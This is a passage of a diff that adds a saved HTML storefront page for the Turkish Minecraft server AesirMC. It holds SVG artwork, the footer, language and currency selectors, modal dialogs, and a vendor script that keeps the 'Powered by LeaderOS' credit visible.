14.472L75.336 14.568C75.528 14.568 75.64 14.552 75.672 14.52C75.736 14.456 75.816 14.424 75.912 14.424H76.104C76.2 14.456 76.28 14.472 76.344 14.472C76.376 14.472 76.424 14.456 76.488 14.424C76.552 14.36 76.6 14.328 76.632 14.328C76.696 14.328 76.728 14.344 76.728 14.376L76.872 14.28H77.496C77.496 14.28 77.592 14.264 77.784 14.232C78.008 14.168 78.216 14.072 78.408 13.944L78.792 13.704C79.048 13.544 79.272 13.432 79.464 13.368C79.656 13.272 79.8 13.192 79.896 13.128C80.376 12.776 80.696 12.392 80.856 11.976C80.856 11.88 80.872 11.768 80.904 11.64C80.968 11.48 81 11.384 81 11.352C81 11.224 80.936 11.096 80.808 10.968C80.808 10.904 80.808 10.808 80.808 10.68C80.84 10.552 80.872 10.408 80.904 10.248L80.808 10.152C80.744 9.896 80.632 9.64 80.472 9.384C80.44 9.384 80.408 9.368 80.376 9.336C80.344 9.304 80.312 9.16 80.28 8.904L80.04 8.712V8.472H79.512C79.48 8.472 79.448 8.456 79.416 8.424C79.384 8.392 79.352 8.376 79.32 8.376H79.08C78.728 8.536 78.552 8.632 78.552 8.664H78.6C78.6 8.664 78.584 8.664 78.552 8.664L78.168 8.52C78.168 8.52 78.088 8.552 77.928 8.616C77.768 8.68 77.592 8.712 77.4 8.712C77.368 8.712 77.336 8.696 77.304 8.664C77.272 8.6 77.224 8.568 77.16 8.568C77.128 8.568 77.064 8.616 76.968 8.712C76.872 8.776 76.808 8.808 76.776 8.808C76.712 8.808 76.664 8.792 76.632 8.76C76.632 8.728 76.616 8.712 76.584 8.712C76.552 8.712 76.504 8.728 76.44 8.76C76.376 8.792 76.328 8.808 76.296 8.808C76.296 8.808 76.184 8.744 75.96 8.616C75.96 8.872 75.864 9 75.672 9C75.544 9 75.48 8.888 75.48 8.664C75.352 8.696 75.24 8.744 75.144 8.808C75.08 8.84 75 8.856 74.904 8.856H74.76L74.616 8.712C74.584 8.808 74.504 8.856 74.376 8.856C74.28 8.856 74.216 8.84 74.184 8.808V8.664C74.152 8.696 74.104 8.728 74.04 8.76C73.976 8.792 73.912 8.824 73.848 8.856V8.904C73.848 9.064 73.752 9.208 73.56 9.336C73.368 9.464 73.096 9.624 72.744 9.816C72.744 9.848 72.744 9.896 72.744 9.96C72.776 9.992 72.792 10.024 72.792 10.056C72.792 10.376 72.648 10.584 72.36 10.68L71.928 11.976C71.992 11.976 72.024 11.992 72.024 12.024L72.552 13.608C72.584 13.608 72.616 13.592 72.648 13.56H72.792C72.888 13.56 72.968 13.672 73.032 13.896C73.096 14.088 73.192 14.184 73.32 14.184C73.352 14.184 73.368 14.168 73.368 14.136H73.416C73.384 14.136 73.512 14.2 73.8 14.328C73.8 14.328 73.896 14.36 74.088 14.424L74.184 14.328C74.632 14.424 74.856 14.504 74.856 14.568ZM84.6442 16.968C84.5482 16.936 84.4522 16.808 84.3562 16.584C84.3242 16.52 84.3402 16.376 84.4042 16.152C84.4042 16.12 84.3722 16.072 84.3082 16.008C84.3722 15.944 84.4362 15.864 84.5002 15.768C84.5322 15.704 84.5802 15.608 84.6442 15.48C84.6762 15.48 84.7242 15.512 84.7882 15.576C84.8522 15.512 85.0442 15.432 85.3642 15.336C85.3002 15.272 85.3002 15.24 85.3642 15.24C85.3962 15.272 85.4762 15.288 85.6042 15.288C85.6362 15.288 85.7162 15.24 85.8442 15.144C85.9402 15.08 86.0202 15.048 86.0842 15.048H86.2282C86.3562 15.048 86.3882 15.016 86.3242 14.952C86.4202 14.888 86.5322 14.824 86.6602 14.76C86.7882 14.696 86.9162 14.632 87.0442 14.568H87.1882L87.2842 14.424H87.3322C87.4922 14.424 87.6682 14.376 87.8602 14.28C88.0842 14.184 88.2122 14.136 88.2442 14.136C88.2762 14.136 88.3402 14.184 88.4362 14.28L88.5322 14.184C88.6922 14.12 88.8362 13.976 88.9642 13.752C89.1562 13.816 89.2842 13.832 89.3482 13.8C89.3162 13.8 89.4922 13.72 89.8762 13.56C89.9402 13.56 90.0522 13.512 90.2122 13.416C90.3722 13.32 90.6762 13.144 91.1242 12.888L90.6922 11.832C90.6922 11.768 90.6762 11.72 90.6442 11.688C90.7402 11.592 90.7562 11.48 90.6922 11.352C90.6602 11.256 90.5802 11.176 90.4522 11.112L90.5002 11.064C90.3082 10.808 90.2282 10.584 90.2602 10.392C90.2282 10.328 90.1322 10.328 89.9722 10.392L89.8282 10.2C89.8282 10.168 89.8922 10.04 90.0202 9.816C89.9242 9.72 89.8282 9.672 89.7322 9.672L89.5402 9.288C89.5402 9.224 89.5882 9.128 89.6842 9C89.5882 8.968 89.5242 8.888 89.4922 8.76L89.5882 7.944C89.6202 7.88 89.6522 7.784 89.6842 7.656C89.7162 7.496 89.7802 7.288 89.8762 7.032L90.6922 5.784C90.6922 5.784 90.8682 5.608 91.2202 5.256C91.8602 4.648 92.2602 4.344 92.4202 4.344V4.392H92.4682C92.5002 4.392 92.5162 4.376 92.5162 4.344C92.7722 4.28 92.9642 4.184 93.0922 4.056C93.2522 3.928 93.4442 3.784 93.6682 3.624H93.7642C93.8922 3.624 93.9562 3.576 93.9562 3.48L94.1002 3.528L94.1962 3.432C94.1962 3.464 94.2122 3.496 94.2442 3.528C94.2762 3.496 94.2922 3.464 94.2922 3.432C94.2922 3.4 94.3082 3.368 94.3402 3.336C94.3082 3.336 94.3082 3.32 94.3402 3.288V3.336C94.3402 3.368 94.3562 3.368 94.3882 3.336H94.7242C94.7242 3.336 94.7562 3.24 94.8202 3.048C94.8202 3.08 94.8362 3.112 94.8682 3.144C94.8682 3.144 94.9322 3.112 95.0602 3.048C95.2202 2.952 95.3642 2.904 95.4922 2.904C95.6202 2.904 95.6842 2.936 95.6842 3C95.7162 3.064 95.7962 3.096 95.9242 3.096H95.9722C95.9402 3.064 95.9562 3.048 96.0202 3.048C96.1802 3.048 96.3882 3.16 96.6442 3.384C96.9322 3.576 97.0922 3.704 97.1242 3.768L97.0282 4.104L96.5482 4.248C96.4842 4.216 96.3562 4.2 96.1642 4.2C96.1002 3.976 96.0042 3.864 95.8762 3.864C95.8442 3.896 95.7962 3.912 95.7322 3.912C95.6682 3.912 95.6042 3.928 95.5402 3.96C95.4442 3.96 95.3482 3.896 95.2522 3.768C95.2202 3.768 95.1882 3.752 95.1562 3.72C95.0282 3.912 94.8522 4.024 94.6282 4.056L94.3402 3.912C94.3082 3.912 94.1802 3.96 93.9562 4.056C93.7642 4.152 93.6522 4.184 93.6202 4.152C93.5562 4.376 93.3482 4.6 92.9962 4.824L92.4682 5.832C92.0202 5.992 91.7962 6.248 91.7962 6.6C91.7962 6.728 91.8442 6.888 91.9402 7.08C91.9402 7.08 91.9082 7.176 91.8442 7.368C91.8122 7.368 91.7482 7.4 91.6522 7.464C91.5562 7.528 91.5082 7.624 91.5082 7.752C91.5082 7.944 91.5722 8.008 91.7002 7.944C91.7642 7.976 91.8122 8.168 91.8442 8.52C91.8442 8.584 91.8122 8.648 91.7482 8.712C91.7802 8.744 91.8282 8.792 91.8922 8.856C91.9562 8.92 92.0362 9.032 92.1322 9.192C92.1962 9.256 92.1962 9.336 92.1322 9.432C92.1642 9.432 92.1962 9.512 92.2282 9.672H92.4202C92.5802 9.864 92.6762 10.136 92.7082 10.488C92.9322 10.744 93.0602 10.968 93.0922 11.16V11.592C93.0282 11.592 92.9802 11.608 92.9482 11.64L93.0922 11.88C93.2202 11.784 93.3482 11.688 93.4762 11.592C93.6042 11.496 93.7482 11.416 93.9082 11.352C93.9402 11.352 93.9882 11.384 94.0522 11.448C94.0842 11.416 94.1162 11.384 94.1482 11.352C94.2122 11.288 94.2602 11.208 94.2922 11.112C94.5162 11.048 94.9162 10.776 95.4922 10.296L95.6362 10.344C95.8922 10.248 96.2122 9.912 96.5962 9.336C96.7242 9.336 96.8042 9.352 96.8362 9.384C96.8362 9.288 96.9162 9.192 97.0762 9.096C97.1722 9.096 97.2522 9.112 97.3162 9.144L97.3642 9.528C97.3642 9.56 97.2842 9.608 97.1242 9.672C96.9962 9.704 96.7402 9.896 96.3562 10.248C96.2922 10.312 96.0362 10.472 95.5882 10.728L95.4442 10.92C95.3482 10.984 95.2202 11.08 95.0602 11.208C94.9322 11.304 94.7722 11.416 94.5802 11.544C94.4522 11.576 94.2922 11.656 94.1002 11.784C93.9402 11.88 93.7482 12.008 93.5242 12.168C93.5562 12.2 93.5722 12.232 93.5722 12.264C93.5722 12.296 93.5402 12.344 93.4762 12.408C93.4122 12.408 93.3802 12.376 93.3802 12.312C93.3482 12.344 93.3002 12.392 93.2362 12.456C93.1722 12.52 93.1402 12.6 93.1402 12.696C93.1402 12.824 93.1402 12.92 93.1402 12.984C93.1722 13.016 93.1882 13.032 93.1882 13.032L93.0442 13.944C93.0122 14.168 92.8202 14.424 92.4682 14.712C92.1162 15 91.9082 15.192 91.8442 15.288C91.7802 15.448 91.7002 15.544 91.6042 15.576H91.5082C91.5082 15.544 91.4922 15.528 91.4602 15.528C91.3962 15.56 91.2202 15.704 90.9322 15.96C90.6442 16.216 90.4682 16.344 90.4042 16.344H90.3562C90.3562 16.312 90.3402 16.296 90.3082 16.296C90.1482 16.328 89.9402 16.472 89.6842 16.728L89.5402 16.632C89.5402 16.696 89.2362 16.744 88.6282 16.776C88.5642 16.776 88.4362 16.712 88.2442 16.584C88.0842 16.488 88.0042 16.424 88.0042 16.392V16.056C88.0362 15.96 88.2282 15.832 88.5802 15.672C88.6122 15.672 88.6442 15.688 88.6762 15.72C88.7082 15.784 88.7562 15.816 88.8202 15.816L89.7802 15.96H89.9242C89.9562 15.96 89.9722 15.944 89.9722 15.912C89.9722 15.88 90.0042 15.848 90.0682 15.816C90.1642 15.816 90.5482 15.528 91.2202 14.952C91.2522 14.888 91.2682 14.792 91.2682 14.664C91.2682 14.696 91.2842 14.728 91.3162 14.76C91.5082 14.696 91.5882 14.568 91.5562 14.376C91.5562 14.184 91.5722 14.072 91.6042 14.04C91.5722 13.944 91.5402 13.912 91.5082 13.944C91.5082 13.912 91.5402 13.832 91.6042 13.704L91.5562 13.464C91.4602 13.336 91.3802 13.304 91.3162 13.368C91.2842 13.368 91.2682 13.384 91.2682 13.416C91.2682 13.448 91.2362 13.464 91.1722 13.464C91.1402 13.464 91.1082 13.448 91.0762 13.416C91.0442 13.352 90.9962 13.352 90.9322 13.416C90.8042 13.48 90.6922 13.608 90.5962 13.8C90.5002 13.96 90.3242 14.088 90.0682 14.184L90.0202 14.136H89.9242C89.9562 14.136 89.9402 14.168 89.8762 14.232C89.8442 14.232 89.8122 14.232 89.7802 14.232C89.7482 14.2 89.7002 14.168 89.6362 14.136C89.7002 14.168 89.7002 14.264 89.6362 14.424L89.5402 14.328L89.2522 14.568L88.7722 14.904C88.7722 14.872 88.7242 14.84 88.6282 14.808C88.5322 14.904 88.4362 14.968 88.3402 15H88.2442C88.2122 14.968 88.1802 14.952 88.1482 14.952L87.9562 15.096C87.7962 15.096 87.6682 15.144 87.5722 15.24C87.7322 15.304 87.6682 15.352 87.3802 15.384C87.3802 15.352 87.3642 15.336 87.3322 15.336H87.2842C86.9962 15.336 86.9802 15.432 87.2362 15.624L87.0922 15.672C87.0922 15.704 87.1082 15.736 87.1402 15.768C87.1402 15.8 87.1242 15.832 87.0922 15.864L87.2362 15.96V16.104C87.0442 16.136 86.8682 16.168 86.7082 16.2C86.5162 16.232 86.3722 16.296 86.2762 16.392L85.9882 16.632L84.6442 16.968Z"></path>
+                            </svg>
+                        </a>
+                    
+                    <div class="hidden lg:flex gap-8 mt-12">
+                        <div @click="openModal(&#39;language&#39;)" class="py-3 px-6 cursor-pointer text-lg text-white font-light tracking-wide rounded-2xl bg-zinc-900/50 border border-white/25 transition hover:bg-white/15">
+                            Türkçe                        </div>
+                        <div @click="openModal(&#39;currency&#39;)" class="py-3 px-6 cursor-pointer text-lg text-white font-light tracking-wide rounded-2xl bg-zinc-900/50 border border-white/25 transition hover:bg-white/15">
+                            TL                        </div>
+                    </div>
+
+                    <div class="flex gap-8 mt-12 lg:hidden">
+                                                    <label for="">
+                                <select class="form-input" onchange="if (!window.__cfRLUnblockHandlers) return false; window.location = &#39;?lang=&#39;+this.value">
+                                                                            <option value="cs">Čeština</option>
+                                                                            <option value="de">Deutsch</option>
+                                                                            <option value="en">English</option>
+                                                                            <option value="es">Español</option>
+                                                                            <option value="fr">Français</option>
+                                                                            <option value="hi">हिन्दी</option>
+                                                                            <option value="hu">Magyar</option>
+                                                                            <option value="it">Italiano</option>
+                                                                            <option value="ja">日本語</option>
+                                                                            <option value="nl">Nederlands</option>
+                                                                            <option value="no">Norsk</option>
+                                                                            <option value="pl">Polski</option>
+                                                                            <option value="pt_BR">Português (Brasil)</option>
+                                                                            <option value="ro">Română</option>
+                                                                            <option value="ru">Русский</option>
+                                                                            <option value="sv">Svenska</option>
+                                                                            <option value="tr" selected="">Türkçe</option>
+                                                                            <option value="vi">Tiếng Việt</option>
+                                                                            <option value="zh_CN">中文</option>
+                                                                    </select>
+                            </label>
+                                                                            <label for="" class="w-40">
+                                <select class="form-input" onchange="if (!window.__cfRLUnblockHandlers) return false; window.location = &#39;?currency=&#39;+this.value">
+                                                                            <option value="EUR">EUR</option>
+                                                                            <option value="TRY" selected="">TL</option>
+                                                                            <option value="USD">USD</option>
+                                                                    </select>
+                            </label>
+                                            </div>
+
+                </div>
+            </div>
+        </div>
+        <div class="h-px bg-cyan-800 w-full flex items-center justify-end transition-all delay-500 duration-500" x-data="{animate:false}" x-intersect.once="animate=true" :class="{&#39;pr-[25%]&#39;:animate}">
+            <div class="absolute rounded-full w-9 h-2 bg-black"></div>
+            <div class="relative mr-3 z-20 rounded-full w-3 h-3 bg-cyan-600"></div>
+        </div>
+
+        <div class="pt-14 pb-28 relative center gap-3 flex-col">
+            <div class="text-cyan-500 text-xl">
+                Tüm hakları saklıdır. © 2026 AesirMC            </div>
+            <div class="text-white/75 font-light text-lg transition hover:text-white group">
+                <a href="https://www.leaderos.com.tr/" target="_blank" id="powered_by_leaderos">Powered by <strong>LeaderOS</strong></a><script type="text/javascript">
+						var is_error;
+						var interval = setInterval(function() {
+							if (is_error) {
+								clearInterval(interval);
+								return false;
+							}
+							
+							var brand_el = document.getElementById("powered_by_leaderos");
+							var is_brand_visible = true;
+							
+							if (brand_el) {
+								var style = window.getComputedStyle(brand_el);
+								if (brand_el.offsetParent === null) {
+									is_brand_visible = false;
+								} else if (style.display === "none") {
+									is_brand_visible = false;
+								} else if (style.visibility === "hidden") {
+									is_brand_visible = false;
+								}
+							} else {
+								is_brand_visible = false;
+							}
+							
+							if (!is_brand_visible) {
+								is_error = true;
+								document.body.innerHTML = "<iframe src='https://www.leaderos.com.tr/powered_by_leaderos.php' style='border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%'></iframe>";
+							}
+						}, 1000);
+					</script>            </div>
+        </div>
+    </div>
+</footer>    <div x-show="modal" id="modals" class="fixed inset-0 bg-zinc-950/40 z-[105] backdrop-blur-[2px] center" style="display: none;">
+    <div x-transition="" x-show="modal === &#39;copyIp&#39;" @click.outside="closeModal" class="bg-aesir-deep rounded-xl border border-white/5 p-12 min-w-[34rem] min-h-52" style="display: none;">
+        <script src="./AesirMC - MMORPG Minecraft_files/dotlottie-player.mjs" type="module"></script>
+
+        <dotlottie-player x-ref="copyIp" class="mx-auto" src="https://lottie.host/f15fca2d-48c4-4fd0-a05d-4070d92b60a7/XeYlMqiFU7.json" background="transparent" speed="1" style="width: 125px; height: 125px;"><template shadowrootmode="open"><!---->
+      <div id="animation-container" lang="en" role="img" aria-label="lottie-animation-container" class="main">
+        <div id="animation" class="animation" style="background:transparent;">
+          <!--?lit$368009106$--> <div class="error">⚠️</div> 
+        </div>
+        <!--?lit$368009106$-->
+      </div>
+    </template></dotlottie-player>
+
+        <div class="text-center text-white text-2xl">
+            Sunucu ip adresi kopyalandi        </div>
+        <div class="mt-2 text-center max-w-sm mx-auto text-zinc-400 font-light text-sm">
+            Sunucu adresini başarıyla kopyaladınız. Şimdi sunucumuza katılma zamanı...        </div>
+        <div class="mt-10 max-w-sm center mx-auto">
+            <div @click="closeModal" class="py-3 px-8 text-sm text-emerald-500 font-light rounded-xl bg-emerald-600/20 transition hover:bg-emerald-500 hover:text-white cursor-pointer">
+                Tamam            </div>
+        </div>
+    </div>
+
+            <div x-transition="" x-show="modal === &#39;language&#39;" @click.outside="closeModal" class="bg-aesir-deep rounded-xl border border-white/5 p-10 min-w-[38rem] min-h-52 absolute top-[10%]" style="display: none;">
+            <div class="text-white text-xl">Select language</div>
+            <div class="mt-6 flex flex-col gap-2 max-h-96 overflow-hidden hover:overflow-auto text-zinc-400 font-light">
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=cs">
+                        Čeština                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=de">
+                        Deutsch                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=en">
+                        English                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=es">
+                        Español                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=fr">
+                        Français                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=hi">
+                        हिन्दी                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=hu">
+                        Magyar                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=it">
+                        Italiano                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=ja">
+                        日本語                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=nl">
+                        Nederlands                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=no">
+                        Norsk                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=pl">
+                        Polski                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=pt_BR">
+                        Português (Brasil)                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=ro">
+                        Română                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=ru">
+                        Русский                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=sv">
+                        Svenska                    </a>
+                                    <a class="rounded-md py-2 px-4 text-white bg-cyan-900" href="https://store.aesirmc.com/?lang=tr">
+                        Türkçe                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=vi">
+                        Tiếng Việt                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?lang=zh_CN">
+                        中文                    </a>
+                            </div>
+        </div>
+    
+            <div x-transition="" x-show="modal === &#39;currency&#39;" @click.outside="closeModal" class="bg-aesir-deep rounded-xl border border-white/5 p-10 min-w-[38rem] min-h-52 absolute top-[10%]" style="display: none;">
+            <div class="text-white text-xl">Select currency</div>
+            <div class="mt-6 flex flex-col gap-2 max-h-96 overflow-hidden hover:overflow-auto text-zinc-400 font-light">
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?currency=EUR">
+                        EUR                    </a>
+                                    <a class="rounded-md py-2 px-4 text-white bg-cyan-900" href="https://store.aesirmc.com/?currency=TRY">
+                        TL                    </a>
+                                    <a class="rounded-md py-2 px-4 transition hover:text-white hover:bg-zinc-800/30" href="https://store.aesirmc.com/?currency=USD">
+                        USD                    </a>
+                            </div>
+        </div>
+    
+
+</div></div>
+
+<!-- Preloader  x-show="loading" -->
+<div x-show="loading" x-transition.opacity.scale="" class="preloader" style="display: none;">
+    <div class="h-full center flex-col">
+        <div class="center relative z-30 w-[30rem]">
+            <img class="w-60 lg:w-[30rem] absolute z-10 opacity-15" src="./AesirMC - MMORPG Minecraft_files/logo.png" alt="">
+            <img class="w-40 lg:w-80 relative z-20" src="./AesirMC - MMORPG Minecraft_files/logo.png" alt="">
+        </div>
+        <div class="absolute top-0 inset-x-0">
+            <svg class="fill-sky-300/5 blur-[1px]" viewBox="0 0 2502 380" xmlns="http://www.w3.org/2000/svg">
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M2502 0V107C2494 109 2461.5 109.5 2459.5 107L2459 103L2456.5 99.5C2456.5 99.5 2461.24 88.8949 2462.5 83C2463.68 77.4623 2463.5 69 2463.5 69C2463.5 69 2457 28 2403.5 29C2356.51 29.8784 2343 69 2343 69V196.5C2343 196.5 2319.5 205 2312.5 210.5C2286.77 230.719 2271.21 246.998 2255.5 273C2242.86 293.934 2236 321 2236 321C2236 321 2234.27 329.401 2236 332C2239 336.5 2245.5 340 2245.5 340L2220 379.5L2192.5 340C2192.5 340 2202.2 328.978 2202.5 327.5C2205.5 312.5 2202 275 2202 275C2202 275 2197.5 267 2193.5 265C2192.4 264.448 2191.95 263.105 2192.5 262C2194 259 2202.5 249.5 2202.5 249.5V196.5C2202.5 196.5 2193.35 172.748 2172.78 146.444C2166.06 149.716 2157.24 152.06 2146.58 153.341C2123.5 156.115 2093.28 153.72 2061.31 146.58C2029.34 139.44 1997.68 128.019 1971.97 114.347C1959.86 107.911 1949.44 101.172 1941.05 94.4092C1921.27 102.486 1904.48 112.648 1890.45 123.268C1891.03 124.701 1891.38 126.501 1891.38 128.457C1891.38 131.379 1890.61 133.955 1889.43 135.474C1890.8 136.908 1891.73 139.698 1891.73 142.905C1891.73 145.828 1890.96 148.405 1889.79 149.924C1891.15 151.358 1892.08 154.147 1892.08 157.352C1892.08 160.274 1891.31 162.85 1890.14 164.369C1891.51 165.803 1892.44 168.593 1892.44 171.8C1892.44 174.723 1891.67 177.3 1890.49 178.819C1891.86 180.253 1892.79 183.042 1892.79 186.248C1892.79 189.169 1892.02 191.744 1890.85 193.263C1892.22 194.697 1893.15 197.487 1893.15 200.695C1893.15 203.619 1892.37 206.197 1891.2 207.715C1892.57 209.15 1893.49 211.938 1893.49 215.143C1893.49 218.066 1892.72 220.643 1891.55 222.162C1892.92 223.596 1893.85 226.385 1893.85 229.59C1893.85 232.513 1893.07 235.089 1891.9 236.608C1893.22 237.99 1894.13 240.631 1894.19 243.69L1894.2 243.686L1894.2 243.793C1894.2 243.875 1894.2 243.956 1894.2 244.038C1894.2 244.421 1894.19 244.798 1894.16 245.168C1894.13 246.409 1894.12 248.041 1894.2 248.443C1894.38 249.29 1894.79 250.221 1895.27 251.086H1895.34L1909 265.219C1908.36 266.172 1907.89 266.489 1906.94 267.124C1906.54 267.386 1906.19 267.562 1905.86 267.728C1905.24 268.035 1904.7 268.309 1904.08 269.03L1901.38 293.485C1901.38 293.485 1902.33 294.805 1902.65 295.549C1902.95 296.255 1902.98 296.505 1902.97 297.137C1902.95 297.686 1901.99 298.041 1900.82 298.47C1899.62 298.91 1898.21 299.428 1897.41 300.313C1895.47 302.448 1893.91 305.369 1894.23 306.983C1894.39 307.777 1893.76 311.112 1891.21 311.112C1888.83 311.112 1887.56 309.047 1887.56 306.983C1887.56 306.665 1883.91 300.313 1883.91 300.313C1883.91 300.313 1882.28 299.42 1881.21 298.884C1880.79 298.671 1880.36 298.575 1879.95 298.484C1879.24 298.325 1878.6 298.181 1878.19 297.455C1877.4 296.031 1879.15 294.596 1879.15 294.596C1879.15 294.596 1879.32 293.05 1879.3 292.056C1879.15 283.322 1876.61 269.348 1876.61 269.348C1876.61 269.348 1876.44 268.673 1876.13 268.395C1875.78 268.084 1875.28 268.041 1874.82 268.001C1874.61 267.982 1874.4 267.964 1874.22 267.918C1873.09 267.623 1872 266.33 1872 266.33C1872 266.33 1880.91 257.073 1883.81 253.979C1884.14 253.451 1884.87 252.252 1885.33 251.122L1885.34 251.086H1885.34C1885.58 250.503 1885.74 249.94 1885.74 249.5V247.363C1885.52 246.343 1885.39 245.219 1885.39 244.038C1885.39 241.116 1886.16 238.539 1887.34 237.02C1885.97 235.586 1885.04 232.797 1885.04 229.59C1885.04 226.667 1885.81 224.091 1886.98 222.572C1885.61 221.137 1884.69 218.348 1884.69 215.143C1884.69 212.221 1885.46 209.644 1886.63 208.125C1885.26 206.691 1884.33 203.902 1884.33 200.695C1884.33 197.773 1885.1 195.198 1886.28 193.678C1884.91 192.244 1883.98 189.454 1883.98 186.248C1883.98 183.325 1884.75 180.749 1885.92 179.23C1884.55 177.795 1883.63 175.006 1883.63 171.8C1883.63 168.877 1884.4 166.3 1885.57 164.781C1884.2 163.347 1883.27 160.558 1883.27 157.352C1883.27 154.429 1884.05 151.852 1885.22 150.333C1883.85 148.899 1882.92 146.11 1882.92 142.905C1882.92 139.983 1883.69 137.407 1884.87 135.888C1883.65 134.61 1882.78 132.255 1882.6 129.488C1848.19 157.996 1833 187.5 1833 187.5C1833 187.5 1818.86 163.687 1790.35 137.068C1785.44 138.44 1780.29 139.591 1774.95 140.504C1759.95 143.069 1743.97 143.669 1728.42 142.249C1712.87 140.829 1698.23 137.433 1685.81 132.363C1673.38 127.293 1663.54 120.705 1657.17 113.182C1650.8 105.659 1648.08 97.4334 1649.27 89.2343C1650.27 82.3369 1654.01 75.6373 1660.21 69.5529C1640.94 65.8936 1620.04 64.2817 1597.5 65.5C1439.5 74.0405 1378 187.5 1378 187.5L1367 213.5C1367 213.5 1366.62 219.298 1369 221C1372.5 223.5 1378 225 1378 225C1378 225 1371.67 236.51 1367 243.5C1362.12 250.807 1353.5 261.5 1353.5 261.5C1353.5 261.5 1344.11 250.108 1338.5 242.5C1334.26 236.746 1328 227.5 1328 227.5L1332 223L1336.5 218V108C1336.5 108 1323.72 109.261 1315.5 109C1309.81 108.819 1301.5 108 1301.5 108L1302.33 84.348C1299.77 87.0593 1296.9 89.4852 1293.78 91.5735C1286.94 96.1417 1279.08 98.9533 1270.9 99.7592C1262.72 100.565 1254.46 99.3406 1246.87 96.194C1239.27 93.0474 1232.57 88.0758 1227.35 81.7197C1222.13 75.3635 1218.56 67.8191 1216.96 59.7545C1215.36 51.6899 1215.77 43.3542 1218.15 35.4858C1218.41 34.6497 1218.68 33.8216 1218.98 33.0023C1191.57 42.4788 1184 65.5 1184 65.5V108L1166 108.5V90.5H1145V108.5H1125.12V90.5H1104.5V108.5L1065.5 109C1065.5 109 1045.04 111.907 1033 117C1021.37 121.92 1005.5 134 1005.5 134C1005.5 134 1002.8 131.476 997.856 127.481C997.802 127.565 997.749 127.648 997.696 127.731C997.563 127.939 997.428 128.146 997.293 128.353C997.123 128.707 996.932 129.023 996.723 129.293C997.722 130.339 998.4 132.375 998.4 134.714C998.4 136.847 997.837 138.727 996.98 139.836C997.979 140.883 998.657 142.918 998.657 145.257C998.657 147.39 998.093 149.27 997.237 150.379C998.236 151.425 998.914 153.461 998.914 155.8C998.914 157.932 998.351 159.812 997.494 160.92C998.494 161.967 999.172 164.003 999.172 166.343C999.172 168.476 998.609 170.356 997.752 171.465C998.751 172.511 999.429 174.547 999.429 176.886C999.429 179.019 998.865 180.899 998.008 182.007C999.007 183.054 999.685 185.089 999.685 187.429C999.685 189.561 999.122 191.441 998.265 192.549C999.265 193.596 999.943 195.632 999.943 197.971C999.943 200.104 999.38 201.984 998.523 203.093C999.486 204.101 1000.15 206.027 1000.2 208.259L1000.2 208.257L1000.2 208.293C1000.2 208.366 1000.2 208.44 1000.2 208.514C1000.2 208.808 1000.19 209.098 1000.17 209.381C1000.15 210.281 1000.14 211.44 1000.2 211.729C1000.33 212.347 1000.63 213.026 1000.98 213.657H1001.03L1011 223.97C1010.54 224.666 1010.19 224.897 1009.49 225.361C1009.21 225.552 1008.95 225.68 1008.71 225.801C1008.26 226.025 1007.86 226.225 1007.41 226.752L1005.44 244.597C1005.44 244.597 1006.13 245.56 1006.36 246.104C1006.58 246.619 1006.61 246.801 1006.6 247.262C1006.59 247.662 1005.88 247.922 1005.03 248.235C1004.16 248.556 1003.13 248.934 1002.54 249.58C1001.12 251.138 999.988 253.269 1000.22 254.447C1000.34 255.026 999.876 257.46 998.021 257.46C996.283 257.46 995.356 255.953 995.356 254.447C995.356 254.215 992.691 249.58 992.691 249.58C992.691 249.58 991.499 248.928 990.721 248.537C990.412 248.382 990.098 248.312 989.802 248.245C989.281 248.129 988.813 248.024 988.519 247.494C987.944 246.455 989.215 245.408 989.215 245.408C989.215 245.408 989.344 244.28 989.33 243.554C989.215 237.181 987.361 226.983 987.361 226.983C987.361 226.983 987.238 226.491 987.013 226.288C986.762 226.061 986.395 226.03 986.061 226.001L986.061 226.001C985.958 225.992 985.859 225.983 985.767 225.969C985.716 225.962 985.668 225.952 985.622 225.94C984.796 225.725 984 224.782 984 224.782C984 224.782 990.501 218.028 992.616 215.77C992.859 215.384 993.391 214.508 993.728 213.682L993.734 213.657H993.738C993.909 213.232 994.028 212.821 994.028 212.5V210.931C993.864 210.189 993.773 209.372 993.773 